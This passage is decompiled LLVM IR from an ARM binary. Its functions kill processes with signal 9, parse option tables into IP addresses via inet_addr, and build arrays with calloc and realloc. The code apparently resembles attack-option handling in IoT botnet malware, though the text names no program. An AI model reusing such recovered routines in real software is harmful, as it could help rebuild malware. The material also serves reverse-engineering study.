dec_label_pc_b030:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_af88, %dec_label_pc_af80, %dec_label_pc_af50, %dec_label_pc_af3c, %dec_label_pc_af34, %dec_label_pc_aef8, %dec_label_pc_afe8
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_aef8 ], [ %stack_var_-52.2, %dec_label_pc_afe8 ], [ %v4_af20, %dec_label_pc_af34 ], [ %v4_af20, %dec_label_pc_af3c ], [ %v4_af20, %dec_label_pc_af50 ], [ %v4_af20, %dec_label_pc_af80 ], [ %v4_af20, %dec_label_pc_af88 ], [ %v4_af20, %dec_label_pc_afa8 ]
  store i32 %v4_ae94, i32* %r1.global-to-local, align 4
  %v2_b034 = icmp eq i32* %v2_ae94, null
  store i1 %v2_b034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b034, label %bb31, label %bb

bb:                                               ; preds = %dec_label_pc_b030
  store i32 %v4_ae94, i32* %r0.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_b030, %bb
  store i32 45120, i32* %lr.global-to-local, align 4
  %v1_b03c = xor i1 %v2_b034, true
  call void @__pseudo_cond_branch(i1 %v1_b03c, i32 ptrtoint (i32* @global_var_8de4.113 to i32))
  %v2_b044 = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_b044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b044, label %.dec_label_pc_ae54_crit_edge, label %dec_label_pc_b04c

.dec_label_pc_ae54_crit_edge:                     ; preds = %bb31
  %v29_ae58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ae54

dec_label_pc_b04c:                                ; preds = %bb31
  %v0_b04c = load i32, i32* @sb, align 4
  %v2_b04c = icmp eq i32 %v0_b04c, 0
  store i1 %v2_b04c, i1* %cpsr_z.global-to-local, align 1
  %tmp32 = icmp slt i32 %v0_b04c, 1
  br i1 %tmp32, label %dec_label_pc_b074, label %dec_label_pc_b054

dec_label_pc_b054:                                ; preds = %dec_label_pc_b04c
  br label %dec_label_pc_b058

dec_label_pc_b058:                                ; preds = %dec_label_pc_b058, %dec_label_pc_b054
  %v0_b064 = phi i32 [ %v1_b064, %dec_label_pc_b058 ], [ 0, %dec_label_pc_b054 ]
  store i32 %stack_var_-52.3, i32* %ip.global-to-local, align 4
  %v4_b05c = mul i32 %v0_b064, 8
  %v5_b05c = add i32 %v4_b05c, %stack_var_-52.3
  %v6_b05c = inttoptr i32 %v5_b05c to i32*
  %v7_b05c = load i32, i32* %v6_b05c, align 4
  store i32 %v7_b05c, i32* %r0.global-to-local, align 4
  %v2_b060 = icmp eq i32 %v7_b05c, 0
  store i1 %v2_b060, i1* %cpsr_z.global-to-local, align 1
  %v1_b064 = add i32 %v0_b064, 1
  store i32 45164, i32* %lr.global-to-local, align 4
  %v1_b068 = xor i1 %v2_b060, true
  call void @__pseudo_cond_branch(i1 %v1_b068, i32 ptrtoint (i32* @global_var_8de4.113 to i32))
  %v0_b06c = load i32, i32* @sb, align 4
  %v9_b06c = icmp eq i32 %v0_b06c, %v1_b064
  store i1 %v9_b06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b06c, label %dec_label_pc_b074, label %dec_label_pc_b058

dec_label_pc_b074:                                ; preds = %dec_label_pc_b058, %dec_label_pc_b04c
  store i32 %stack_var_-52.3, i32* %r0.global-to-local, align 4
  store i32 %v9_ae30, i32* @r6, align 4
  store i32 %v12_ae30, i32* @r7, align 4
  store i32 %v18_ae30, i32* @sb, align 4
  store i32 %v21_ae30, i32* @sl, align 4
  store i32 %v27_ae30, i32* %lr.global-to-local, align 4
  %v1_b080 = inttoptr i32 %stack_var_-52.3 to i32*
  call void @free(i32* %v1_b080)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i1 %v2_b034, { 0, 2, 1 }
  uselistorder i32 %stack_var_-52.3, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_afec, { 2, 0, 1 }
  uselistorder i32 %stack_var_-52.2, { 1, 0, 2 }
  uselistorder i32 %v1_afd8, { 1, 0 }
  uselistorder i32 %v3_afbc, { 0, 2, 1 }
  uselistorder i32 %v2_af94, { 2, 1, 0 }
  uselistorder i32 %v2_afac, { 1, 0 }
  uselistorder i32 %v4_afa8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_af9c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_af98, { 1, 0 }
  uselistorder i32 %v0_af34, { 0, 2, 1 }
  uselistorder i32 %v0_af24, { 0, 2, 1, 3 }
  uselistorder i32 %v4_af20, { 0, 1, 2, 8, 7, 6, 3, 5, 9, 10, 4, 11 }
  uselistorder i32 %v3_af04, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_aee0, { 1, 0 }
  uselistorder i32 %v0_aec4, { 0, 2, 1 }
  uselistorder i32 %v0_aea0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_ae94, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 %v2_ae80, { 2, 1, 0 }
  uselistorder i32 %v4_ae6c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_ae60, { 1, 0, 2 }
  uselistorder i32 %v0_ae40, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 22, 6, 2, 7, 10, 14, 11, 8, 9, 12, 13, 20, 15, 17, 16, 18, 19, 23, 21, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 5, 4, 6 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_b030, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_ae54, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_b084(i32 %arg1) local_unnamed_addr {
dec_label_pc_b084:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_b084 = load i32, i32* @r4, align 4
  store i32 %v3_b084, i32* %stack_var_-12, align 4
  %v6_b084 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1ccd8.115 to i32), i32* @r4, align 4
  %v2_b08c = load i32, i32* @global_var_1ccd8.115, align 4
  %v2_b090 = icmp eq i32 %v2_b08c, 0
  br i1 %v2_b090, label %dec_label_pc_b098, label %dec_label_pc_b118

dec_label_pc_b098:                                ; preds = %dec_label_pc_b084
  %v3_b098 = load i32, i32* @global_var_1ccdc.116, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_b0a0 = icmp eq i32 %v3_b098, 0
  store i32 0, i32* @global_var_1ccd8.115, align 4
  br i1 %v2_b0a0, label %dec_label_pc_b0ac, label %dec_label_pc_b134

dec_label_pc_b0ac:                                ; preds = %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge, %dec_label_pc_b098
  %v0_b0b4 = phi i32 [ %v0_b0b4.pre, %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge ], [ 0, %dec_label_pc_b098 ]
  %v1_b0b4 = phi i32 [ %v0_b0ac.pre, %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge ], [ ptrtoint (i32* @global_var_1ccd8.115 to i32), %dec_label_pc_b098 ]
  %v1_b0ac = add i32 %v1_b0b4, 8
  %v2_b0ac = inttoptr i32 %v1_b0ac to i32*
  %v3_b0ac = load i32, i32* %v2_b0ac, align 4
  %v2_b0b0 = icmp eq i32 %v3_b0ac, 0
  %v2_b0b4 = add i32 %v1_b0b4, 4
  %v3_b0b4 = inttoptr i32 %v2_b0b4 to i32*
  store i32 %v0_b0b4, i32* %v3_b0b4, align 4
  br i1 %v2_b0b0, label %dec_label_pc_b0bc, label %dec_label_pc_b14c

dec_label_pc_b0bc:                                ; preds = %dec_label_pc_b0ac, %dec_label_pc_b134
  %v0_b0bc = load i32, i32* @r4, align 4
  %v1_b0bc = add i32 %v0_b0bc, 12
  %v2_b0bc = inttoptr i32 %v1_b0bc to i32*
  %v3_b0bc = load i32, i32* %v2_b0bc, align 4
  %v2_b0c0 = icmp eq i32 %v3_b0bc, 0
  %v0_b0c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0c4 = add i32 %v0_b0bc, 8
  %v3_b0c4 = inttoptr i32 %v2_b0c4 to i32*
  store i32 %v0_b0c4, i32* %v3_b0c4, align 4
  br i1 %v2_b0c0, label %dec_label_pc_b0cc, label %dec_label_pc_b164

dec_label_pc_b0cc:                                ; preds = %dec_label_pc_b0bc, %dec_label_pc_b14c
  %v0_b0cc = load i32, i32* @r4, align 4
  %v1_b0cc = add i32 %v0_b0cc, 16
  %v2_b0cc = inttoptr i32 %v1_b0cc to i32*
  %v3_b0cc = load i32, i32* %v2_b0cc, align 4
  %v2_b0d0 = icmp eq i32 %v3_b0cc, 0
  %v0_b0d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0d4 = add i32 %v0_b0cc, 12
  %v3_b0d4 = inttoptr i32 %v2_b0d4 to i32*
  store i32 %v0_b0d4, i32* %v3_b0d4, align 4
  br i1 %v2_b0d0, label %dec_label_pc_b0dc, label %dec_label_pc_b17c

dec_label_pc_b0dc:                                ; preds = %dec_label_pc_b0cc, %dec_label_pc_b164
  %v0_b0dc = load i32, i32* @r4, align 4
  %v1_b0dc = add i32 %v0_b0dc, 20
  %v2_b0dc = inttoptr i32 %v1_b0dc to i32*
  %v3_b0dc = load i32, i32* %v2_b0dc, align 4
  %v2_b0e0 = icmp eq i32 %v3_b0dc, 0
  %v0_b0e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0e4 = add i32 %v0_b0dc, 16
  %v3_b0e4 = inttoptr i32 %v2_b0e4 to i32*
  store i32 %v0_b0e4, i32* %v3_b0e4, align 4
  br i1 %v2_b0e0, label %dec_label_pc_b0ec, label %dec_label_pc_b194

dec_label_pc_b0ec:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b17c
  %v0_b0ec = load i32, i32* @r4, align 4
  %v1_b0ec = add i32 %v0_b0ec, 24
  %v2_b0ec = inttoptr i32 %v1_b0ec to i32*
  %v3_b0ec = load i32, i32* %v2_b0ec, align 4
  %v2_b0f0 = icmp eq i32 %v3_b0ec, 0
  %v0_b0f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0f4 = add i32 %v0_b0ec, 20
  %v3_b0f4 = inttoptr i32 %v2_b0f4 to i32*
  store i32 %v0_b0f4, i32* %v3_b0f4, align 4
  br i1 %v2_b0f0, label %dec_label_pc_b0fc, label %dec_label_pc_b1ac

dec_label_pc_b0fc:                                ; preds = %dec_label_pc_b0ec, %dec_label_pc_b194
  %v0_b0fc = load i32, i32* @r4, align 4
  %v1_b0fc = add i32 %v0_b0fc, 28
  %v2_b0fc = inttoptr i32 %v1_b0fc to i32*
  %v3_b0fc = load i32, i32* %v2_b0fc, align 4
  %v2_b100 = icmp eq i32 %v3_b0fc, 0
  %v0_b104 = load i32, i32* %r5.global-to-local, align 4
  %v2_b104 = add i32 %v0_b0fc, 24
  %v3_b104 = inttoptr i32 %v2_b104 to i32*
  store i32 %v0_b104, i32* %v3_b104, align 4
  br i1 %v2_b100, label %dec_label_pc_b10c, label %dec_label_pc_b1c4

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b0fc, %dec_label_pc_b1ac, %dec_label_pc_b1c4
  %v0_b10c = load i32, i32* %r5.global-to-local, align 4
  %v1_b10c = load i32, i32* @r4, align 4
  %v2_b10c = add i32 %v1_b10c, 28
  %v3_b10c = inttoptr i32 %v2_b10c to i32*
  store i32 %v0_b10c, i32* %v3_b10c, align 4
  %v2_b110 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_b110, i32* @r4, align 4
  store i32 %v6_b084, i32* @r5, align 4
  %v0_b114 = call i32 @function_11624()
  br label %dec_label_pc_b118

dec_label_pc_b118:                                ; preds = %dec_label_pc_b084, %dec_label_pc_b10c
  %v2_b11c = call i32 @kill(i32 9, i32 9)
  %v0_b120 = load i32, i32* @r4, align 4
  %v1_b120 = add i32 %v0_b120, 4
  %v2_b120 = inttoptr i32 %v1_b120 to i32*
  %v3_b120 = load i32, i32* %v2_b120, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_b128 = icmp eq i32 %v3_b120, 0
  %v2_b12c = inttoptr i32 %v0_b120 to i32*
  store i32 0, i32* %v2_b12c, align 4
  br i1 %v2_b128, label %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge, label %dec_label_pc_b134

dec_label_pc_b118.dec_label_pc_b0ac_crit_edge:    ; preds = %dec_label_pc_b118
  %v0_b0ac.pre = load i32, i32* @r4, align 4
  %v0_b0b4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_b0ac

dec_label_pc_b134:                                ; preds = %dec_label_pc_b098, %dec_label_pc_b118
  %v2_b138 = call i32 @kill(i32 9, i32 9)
  %v0_b13c = load i32, i32* @r4, align 4
  %v1_b13c = add i32 %v0_b13c, 8
  %v2_b13c = inttoptr i32 %v1_b13c to i32*
  %v3_b13c = load i32, i32* %v2_b13c, align 4
  %v2_b140 = icmp eq i32 %v3_b13c, 0
  %v0_b144 = load i32, i32* %r5.global-to-local, align 4
  %v2_b144 = add i32 %v0_b13c, 4
  %v3_b144 = inttoptr i32 %v2_b144 to i32*
  store i32 %v0_b144, i32* %v3_b144, align 4
  br i1 %v2_b140, label %dec_label_pc_b0bc, label %dec_label_pc_b14c

dec_label_pc_b14c:                                ; preds = %dec_label_pc_b0ac, %dec_label_pc_b134
  %v2_b150 = call i32 @kill(i32 9, i32 9)
  %v0_b154 = load i32, i32* @r4, align 4
  %v1_b154 = add i32 %v0_b154, 12
  %v2_b154 = inttoptr i32 %v1_b154 to i32*
  %v3_b154 = load i32, i32* %v2_b154, align 4
  %v2_b158 = icmp eq i32 %v3_b154, 0
  %v0_b15c = load i32, i32* %r5.global-to-local, align 4
  %v2_b15c = add i32 %v0_b154, 8
  %v3_b15c = inttoptr i32 %v2_b15c to i32*
  store i32 %v0_b15c, i32* %v3_b15c, align 4
  br i1 %v2_b158, label %dec_label_pc_b0cc, label %dec_label_pc_b164

dec_label_pc_b164:                                ; preds = %dec_label_pc_b0bc, %dec_label_pc_b14c
  %v2_b168 = call i32 @kill(i32 9, i32 9)
  %v0_b16c = load i32, i32* @r4, align 4
  %v1_b16c = add i32 %v0_b16c, 16
  %v2_b16c = inttoptr i32 %v1_b16c to i32*
  %v3_b16c = load i32, i32* %v2_b16c, align 4
  %v2_b170 = icmp eq i32 %v3_b16c, 0
  %v0_b174 = load i32, i32* %r5.global-to-local, align 4
  %v2_b174 = add i32 %v0_b16c, 12
  %v3_b174 = inttoptr i32 %v2_b174 to i32*
  store i32 %v0_b174, i32* %v3_b174, align 4
  br i1 %v2_b170, label %dec_label_pc_b0dc, label %dec_label_pc_b17c

dec_label_pc_b17c:                                ; preds = %dec_label_pc_b0cc, %dec_label_pc_b164
  %v2_b180 = call i32 @kill(i32 9, i32 9)
  %v0_b184 = load i32, i32* @r4, align 4
  %v1_b184 = add i32 %v0_b184, 20
  %v2_b184 = inttoptr i32 %v1_b184 to i32*
  %v3_b184 = load i32, i32* %v2_b184, align 4
  %v2_b188 = icmp eq i32 %v3_b184, 0
  %v0_b18c = load i32, i32* %r5.global-to-local, align 4
  %v2_b18c = add i32 %v0_b184, 16
  %v3_b18c = inttoptr i32 %v2_b18c to i32*
  store i32 %v0_b18c, i32* %v3_b18c, align 4
  br i1 %v2_b188, label %dec_label_pc_b0ec, label %dec_label_pc_b194

dec_label_pc_b194:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b17c
  %v2_b198 = call i32 @kill(i32 9, i32 9)
  %v0_b19c = load i32, i32* @r4, align 4
  %v1_b19c = add i32 %v0_b19c, 24
  %v2_b19c = inttoptr i32 %v1_b19c to i32*
  %v3_b19c = load i32, i32* %v2_b19c, align 4
  %v2_b1a0 = icmp eq i32 %v3_b19c, 0
  %v0_b1a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b1a4 = add i32 %v0_b19c, 20
  %v3_b1a4 = inttoptr i32 %v2_b1a4 to i32*
  store i32 %v0_b1a4, i32* %v3_b1a4, align 4
  br i1 %v2_b1a0, label %dec_label_pc_b0fc, label %dec_label_pc_b1ac

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b0ec, %dec_label_pc_b194
  %v2_b1b0 = call i32 @kill(i32 9, i32 9)
  %v0_b1b4 = load i32, i32* @r4, align 4
  %v1_b1b4 = add i32 %v0_b1b4, 28
  %v2_b1b4 = inttoptr i32 %v1_b1b4 to i32*
  %v3_b1b4 = load i32, i32* %v2_b1b4, align 4
  %v2_b1b8 = icmp eq i32 %v3_b1b4, 0
  %v0_b1bc = load i32, i32* %r5.global-to-local, align 4
  %v2_b1bc = add i32 %v0_b1b4, 24
  %v3_b1bc = inttoptr i32 %v2_b1bc to i32*
  store i32 %v0_b1bc, i32* %v3_b1bc, align 4
  br i1 %v2_b1b8, label %dec_label_pc_b10c, label %dec_label_pc_b1c4

dec_label_pc_b1c4:                                ; preds = %dec_label_pc_b0fc, %dec_label_pc_b1ac
  %v2_b1c8 = call i32 @kill(i32 9, i32 9)
  br label %dec_label_pc_b10c

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 11, 12, 13, 2, 3, 4, 0, 1, 7, 5, 6, 8, 9, 10, 14 }
  uselistorder label %dec_label_pc_b1c4, { 1, 0 }
  uselistorder label %dec_label_pc_b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_b194, { 1, 0 }
  uselistorder label %dec_label_pc_b17c, { 1, 0 }
  uselistorder label %dec_label_pc_b164, { 1, 0 }
  uselistorder label %dec_label_pc_b14c, { 1, 0 }
  uselistorder label %dec_label_pc_b134, { 1, 0 }
  uselistorder label %dec_label_pc_b118, { 1, 0 }
  uselistorder label %dec_label_pc_b10c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b0fc, { 1, 0 }
  uselistorder label %dec_label_pc_b0ec, { 1, 0 }
  uselistorder label %dec_label_pc_b0dc, { 1, 0 }
  uselistorder label %dec_label_pc_b0cc, { 1, 0 }
  uselistorder label %dec_label_pc_b0bc, { 1, 0 }
}

define i32 @function_b1d4(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_b1d4:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_b1d4 = urem i32 %arg1, 256
  %v2_b1d8 = icmp eq i32 %v1_b1d4, 0
  br i1 %v2_b1d8, label %dec_label_pc_b224, label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1d4
  %v0_b1e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b1e8 = add i32 %v0_b1e8, 4
  %v2_b1e8 = inttoptr i32 %v1_b1e8 to i8*
  %v3_b1e8 = load i8, i8* %v2_b1e8, align 1
  %v4_b1e8 = zext i8 %v3_b1e8 to i32
  %v1_b1ec = urem i32 %arg3, 256
  %v9_b1f0 = icmp eq i32 %v4_b1e8, %v1_b1ec
  br i1 %v9_b1f0, label %dec_label_pc_b22c, label %dec_label_pc_b214.preheader

dec_label_pc_b214.preheader:                      ; preds = %dec_label_pc_b1e8
  br label %dec_label_pc_b214

dec_label_pc_b204:                                ; preds = %dec_label_pc_b214
  %v1_b204 = add i32 %v0_b20c.in, 12
  %v2_b204 = inttoptr i32 %v1_b204 to i8*
  %v3_b204 = load i8, i8* %v2_b204, align 1
  %v4_b204 = zext i8 %v3_b204 to i32
  %v9_b208 = icmp eq i32 %v1_b1ec, %v4_b204
  br i1 %v9_b208, label %dec_label_pc_b22c, label %dec_label_pc_b214

dec_label_pc_b214:                                ; preds = %dec_label_pc_b214.preheader, %dec_label_pc_b204
  %v0_b20c.in = phi i32 [ %v0_b1e8, %dec_label_pc_b214.preheader ], [ %v0_b20c, %dec_label_pc_b204 ]
  %v0_b214 = phi i32 [ 0, %dec_label_pc_b214.preheader ], [ %v1_b214, %dec_label_pc_b204 ]
  %v0_b20c = add i32 %v0_b20c.in, 8
  %v1_b214 = add i32 %v0_b214, 1
  %v9_b218 = icmp eq i32 %v1_b1d4, %v1_b214
  store i32 %v0_b20c, i32* %r1.global-to-local, align 4
  br i1 %v9_b218, label %dec_label_pc_b224, label %dec_label_pc_b204

dec_label_pc_b224:                                ; preds = %dec_label_pc_b214, %dec_label_pc_b22c, %dec_label_pc_b1d4
  ret i32 %arg4

dec_label_pc_b22c:                                ; preds = %dec_label_pc_b204, %dec_label_pc_b1e8
  %v0_b22c = phi i32 [ %v0_b1e8, %dec_label_pc_b1e8 ], [ %v0_b20c, %dec_label_pc_b204 ]
  %v1_b22c = inttoptr i32 %v0_b22c to i32*
  %v2_b22c = load i32, i32* %v1_b22c, align 4
  %v3_b230 = icmp eq i32 %v2_b22c, 0
  br i1 %v3_b230, label %dec_label_pc_b224, label %dec_label_pc_b238

dec_label_pc_b238:                                ; preds = %dec_label_pc_b22c
  %v3_b22c = inttoptr i32 %v2_b22c to i8*
  %v3_b23c = call i32 @inet_addr(i8* %v3_b22c)
  ret i32 %v3_b23c

; uselistorder directives
  uselistorder i32 %v2_b22c, { 1, 0 }
  uselistorder i32 %v1_b214, { 1, 0 }
  uselistorder i32 %v0_b20c, { 1, 0, 2 }
  uselistorder i32 %v0_b20c.in, { 1, 0 }
  uselistorder i32 %v1_b1ec, { 1, 0 }
  uselistorder i32 %v0_b1e8, { 1, 0, 2 }
  uselistorder i32 %v1_b1d4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b224, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b214, { 1, 0 }
}

define i32 @function_b240(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b240:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_b240 = urem i32 %arg1, 256
  %v2_b244 = icmp eq i32 %v1_b240, 0
  %v3_b248 = load i32, i32* @r4, align 4
  br i1 %v2_b244, label %dec_label_pc_b290, label %dec_label_pc_b254

dec_label_pc_b254:                                ; preds = %dec_label_pc_b240
  %v0_b254 = load i32, i32* %r1.global-to-local, align 4
  %v1_b254 = add i32 %v0_b254, 4
  %v2_b254 = inttoptr i32 %v1_b254 to i8*
  %v3_b254 = load i8, i8* %v2_b254, align 1
  %v4_b254 = zext i8 %v3_b254 to i32
  %v1_b258 = urem i32 %arg3, 256
  %v9_b25c = icmp eq i32 %v4_b254, %v1_b258
  br i1 %v9_b25c, label %dec_label_pc_b298, label %dec_label_pc_b280.preheader

dec_label_pc_b280.preheader:                      ; preds = %dec_label_pc_b254
  br label %dec_label_pc_b280

dec_label_pc_b270:                                ; preds = %dec_label_pc_b280
  %v1_b270 = add i32 %v0_b278.in, 12
  %v2_b270 = inttoptr i32 %v1_b270 to i8*
  %v3_b270 = load i8, i8* %v2_b270, align 1
  %v4_b270 = zext i8 %v3_b270 to i32
  %v9_b274 = icmp eq i32 %v1_b258, %v4_b270
  br i1 %v9_b274, label %dec_label_pc_b298, label %dec_label_pc_b280

dec_label_pc_b280:                                ; preds = %dec_label_pc_b280.preheader, %dec_label_pc_b270
  %v0_b278.in = phi i32 [ %v0_b254, %dec_label_pc_b280.preheader ], [ %v0_b278, %dec_label_pc_b270 ]
  %v0_b280 = phi i32 [ 0, %dec_label_pc_b280.preheader ], [ %v1_b280, %dec_label_pc_b270 ]
  %v0_b278 = add i32 %v0_b278.in, 8
  %v1_b280 = add i32 %v0_b280, 1
  store i32 %v1_b280, i32* @lr, align 4
  %v9_b284 = icmp eq i32 %v1_b240, %v1_b280
  store i32 %v0_b278, i32* %r1.global-to-local, align 4
  br i1 %v9_b284, label %dec_label_pc_b290, label %dec_label_pc_b270

dec_label_pc_b290:                                ; preds = %dec_label_pc_b280, %dec_label_pc_b298, %dec_label_pc_b240
  store i32 %v3_b248, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_b298:                                ; preds = %dec_label_pc_b270, %dec_label_pc_b254
  %v0_b298 = phi i32 [ %v0_b254, %dec_label_pc_b254 ], [ %v0_b278, %dec_label_pc_b270 ]
  %v1_b298 = inttoptr i32 %v0_b298 to i32*
  %v2_b298 = load i32, i32* %v1_b298, align 4
  %v2_b29c = icmp eq i32 %v2_b298, 0
  br i1 %v2_b29c, label %dec_label_pc_b290, label %dec_label_pc_b2a4

dec_label_pc_b2a4:                                ; preds = %dec_label_pc_b298
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_b248, i32* @r4, align 4
  %v2_b2ac = inttoptr i32 %v2_b298 to i8*
  %v3_b2ac = call i32 @function_13ac8(i8* %v2_b2ac, i32 10)
  ret i32 %v3_b2ac

; uselistorder directives
  uselistorder i32 %v1_b280, { 1, 2, 0 }
  uselistorder i32 %v0_b278, { 1, 0, 2 }
  uselistorder i32 %v0_b278.in, { 1, 0 }
  uselistorder i32 %v1_b258, { 1, 0 }
  uselistorder i32 %v0_b254, { 1, 0, 2 }
  uselistorder i32 %v3_b248, { 1, 0 }
  uselistorder i32 %v1_b240, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_b290, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b280, { 1, 0 }
}

define i32 @function_b2b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_b2b0:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_b2b0 = load i32, i32* @r4, align 4
  store i32 %v3_b2b0, i32* %stack_var_-20, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_b2bc = call i32* @calloc(i32 1, i32 8)
  %v3_b2bc = ptrtoint i32* %v2_b2bc to i32
  store i32 ptrtoint (i8** @global_var_1ccd0.109 to i32), i32* %r4.global-to-local, align 4
  %v2_b2c4 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b2c4 = zext i8 %v2_b2c4 to i32
  store i32 ptrtoint (i32* @global_var_1ccd4.111 to i32), i32* %r6.global-to-local, align 4
  store i32 56956, i32* %r2.global-to-local, align 4
  store i32 %v3_b2bc, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b2d8 = mul nuw nsw i32 %v3_b2c4, 4
  store i32 %v3_b2d8, i32* %r1.global-to-local, align 4
  %v2_b2dc = load i32, i32* @global_var_1ccd4.111, align 4
  store i32 56956, i32* %v2_b2bc, align 4
  %v0_b2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2e4 = trunc i32 %v0_b2e4 to i8
  %v2_b2e4 = load i32, i32* %r5.global-to-local, align 4
  %v3_b2e4 = add i32 %v2_b2e4, 4
  %v4_b2e4 = inttoptr i32 %v3_b2e4 to i8*
  store i8 %v1_b2e4, i8* %v4_b2e4, align 1
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 4
  store i32 %v1_b2e8, i32* %r1.global-to-local, align 4
  %v4_b2ec = inttoptr i32 %v2_b2dc to i32*
  %v5_b2ec = call i32* @realloc(i32* %v4_b2ec, i32 %v1_b2e8)
  %v7_b2ec = ptrtoint i32* %v5_b2ec to i32
  %v2_b2f0 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b2f0 = zext i8 %v2_b2f0 to i32
  store i32 %v3_b2f0, i32* %r3.global-to-local, align 4
  store i32 %v7_b2ec, i32* %ip.global-to-local, align 4
  %v0_b2f8 = load i32, i32* %r5.global-to-local, align 4
  %v5_b2f8 = mul nuw nsw i32 %v3_b2f0, 4
  %v6_b2f8 = add i32 %v5_b2f8, %v7_b2ec
  %v7_b2f8 = inttoptr i32 %v6_b2f8 to i32*
  store i32 %v0_b2f8, i32* %v7_b2f8, align 4
  store i32 ptrtoint (i8* @global_var_1ccd1.120 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_b308 = load i32, i32* %r4.global-to-local, align 4
  %v3_b308 = inttoptr i32 %v2_b308 to i8*
  store i8 ptrtoint (i8* @global_var_1ccd1.120 to i8), i8* %v3_b308, align 1
  %v0_b30c = load i32, i32* %ip.global-to-local, align 4
  %v1_b30c = load i32, i32* %r6.global-to-local, align 4
  %v2_b30c = inttoptr i32 %v1_b30c to i32*
  store i32 %v0_b30c, i32* %v2_b30c, align 4
  %v2_b310 = call i32* @calloc(i32 1, i32 8)
  %v3_b310 = ptrtoint i32* %v2_b310 to i32
